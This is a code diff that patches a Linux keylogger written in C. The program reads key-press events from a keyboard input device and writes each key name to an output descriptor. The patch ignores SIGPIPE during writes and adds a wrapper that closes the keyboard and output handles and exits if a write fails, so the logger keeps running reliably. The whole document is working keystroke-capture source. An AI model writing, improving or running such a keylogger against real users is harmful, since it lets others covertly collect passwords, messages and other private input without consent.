@@ -1,5 +1,6 @@
 #include <linux/input.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <signal.h>
 #include <string.h>
@@ -95,18 +96,41 @@ void sigint_handler(int sig){
  * \returns 1 if writing completes succesfully, else 0
  */
 int write_all(int file_desc, const char *str){
+    struct sigaction new_actn, old_actn;
+    new_actn.sa_handler = SIG_IGN;
+    sigemptyset (&new_actn.sa_mask);
+    new_actn.sa_flags = 0;
+    sigaction(SIGPIPE, &new_actn, &old_actn);
+
     int bytesWritten = 0;
     int bytesToWrite = strlen(str) + 1;
 
     do {
         bytesWritten = write(file_desc, str, bytesToWrite);
 
-        if(bytesWritten == -1) return 0;
+        if(bytesWritten == -1){
+            sigaction(SIGPIPE, &old_actn, NULL);
+            return 0;
+        }
         bytesToWrite -= bytesWritten;
         str += bytesWritten;
     } while(bytesToWrite > 0);
 
+    sigaction(SIGPIPE, &old_actn, NULL);
     return 1;
+}
+
+
+/**
+ * Wrapper around write_all which exits safely if the write fails
+ */
+void safe_write_all(int file_desc, const char *str, int keyboard){
+    if(!write_all(file_desc, str)){
+        close(file_desc);
+        close(keyboard);
+        perror("\nwriting");
+        exit(1);
+    }
 }
 
 void keylogger(int keyboard, int writeout){
@@ -124,8 +148,8 @@ void keylogger(int keyboard, int writeout){
             if(events[i].type == EV_KEY){
                 if(events[i].value == 1){
                     if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
-                        write_all(writeout, keycodes[events[i].code]);
-                        write_all(writeout, "\n");
+                        safe_write_all(writeout, keycodes[events[i].code], keyboard);
+                        safe_write_all(writeout, "\n", keyboard);
                     }
                     else{
                         write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
@@ -134,5 +158,5 @@ void keylogger(int keyboard, int writeout){
             }
         }
     }
-    write_all(writeout, "\n");
+    if(bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
 }
